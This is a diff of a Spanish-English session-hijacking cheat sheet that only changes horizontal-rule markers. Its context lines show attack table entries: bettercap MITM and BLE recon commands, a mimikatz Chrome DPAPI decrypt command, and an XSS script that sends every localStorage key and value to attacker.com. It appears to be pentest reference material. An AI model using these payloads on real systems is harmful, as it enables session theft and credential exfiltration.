@@ -17,7 +17,7 @@ linked:
 ---
 # Session Hijacking - Vectores de Robo
 
-***
+---
 
 ## XSS para `document.cookie`
 
@@ -65,7 +65,7 @@ linked:
 </script>
 ```
 
-___
+---
 
 ## MITM (HTTP Plaintext / Weak TLS)
 
@@ -88,7 +88,7 @@ ___
 | `sudo bettercap -caplet rogue-mysql` | Bettercap rogue service intercept | Service-specific. |
 ^sh-vector-mitm
 
-___
+---
 
 ## Network Sniffing (LAN / Shared)
 
@@ -111,7 +111,7 @@ ___
 | `sudo bettercap -caplet ble.recon` | Bettercap BLE recon | BLE adjacent. |
 ^sh-vector-sniffing
 
-___
+---
 
 ## Browser Exploit / Extension Abuse
 
@@ -131,7 +131,7 @@ ___
 | `python3 mimikatz.py dpapi::chrome /unprotect` | mimikatz DPAPI Chrome decrypt | Windows post-exploit. |
 ^sh-vector-browser
 
-___
+---
 
 ## Cookie Theft via Local JS
 
@@ -151,4 +151,4 @@ ___
 | `<script>(async()=>{for(let k in localStorage){fetch('//attacker.com/?k='+k+'&v='+localStorage[k])}})()</script>` | Iterate all localStorage keys | Mass scan. |
 ^sh-vector-localjs
 
-***
+---
